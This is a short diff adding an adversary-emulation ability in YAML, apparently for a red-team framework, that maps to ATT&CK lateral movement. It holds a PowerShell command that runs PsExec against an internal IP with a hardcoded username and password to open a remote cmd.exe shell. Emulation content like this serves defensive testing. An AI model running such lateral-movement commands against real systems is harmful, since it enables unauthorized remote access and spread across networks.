@@ -1,0 +1,14 @@
+- id: tx1_lateral_get_remote_shell
+  name: TX1_Lateral_Get_Remote_Shell
+  description: Open cmd.exe session remotely via PsExec.
+  tactic: lateral-movement
+  technique:
+    attack_id: T1570
+    name: Lateral Tool Transfer
+  platforms:
+    windows:
+      psh:
+        command: |
+          Start-Process -FilePath "C:\Users\Public\psexec.exe" -ArgumentList '\\172.18.24.12', '-u', 'txone', '-p', 'tx1otdemo', '-d', '-realtime', 'cmd.exe' -NoNewWindow;
+        payloads:
+          - psexec.exe
